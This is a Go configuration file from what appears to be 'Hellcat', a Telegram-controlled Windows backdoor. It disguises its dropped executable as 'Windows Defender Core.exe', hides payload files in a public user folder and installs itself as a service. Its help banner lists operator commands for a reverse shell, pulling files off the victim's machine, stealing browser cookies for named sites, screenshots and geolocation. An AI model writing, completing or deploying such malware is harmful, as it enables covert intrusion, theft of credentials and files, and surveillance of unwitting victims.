package config

const (
	/*
		Telegram bot configurations.
	*/
	API        = ""
	MSG_REPLY  = false
	DEBUG_MODE = false
	TIMEOUT    = 30

	/*
		Hellcat configurations.
	*/
	NNAME          = "Windows Defender Core.exe"
	START_SERVICE  = "wininit.bat"
	REMOVE_SERVICE = "rm.bat"
	PAYLOAD_PATH   = "C:\\Users\\Public\\"
	HIDE_FILE      = true
)

const HELP = `
	░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
	░░░░░ ███████ ]▄▄▄▄▄▄▄▄▃ ░░░░░░░░░░░░
	▂▄▅█████████▅▄▃▂░░░░░ ᵂᵉˡᶜᵒᵐᵉ ᵗᵒ ᴴᵉˡˡᶜᵃᵗ ░░░░░
	I███████████████████].░░░░░░░░░░░░░░░░░
	◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...░░░░░░░░░░░░░░░░
	░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
	
	❑ Home
   
	/help - Show all commands.
	/kill - Kill current running backdoor.
	/remove - Self-Remove current backdoor.

	❑ Tools
	
	/shell, /sh <cmd> - Reverse shell from client machine.
	/download <path> - Download file from client machine.
	/cookie <name> <url> - Retrieve the website's cookies from client.
	/screen <name> - Screenshot client display.
	/geoip <city-mmdb> - Retrieve the client geolocation from IPv4.
`
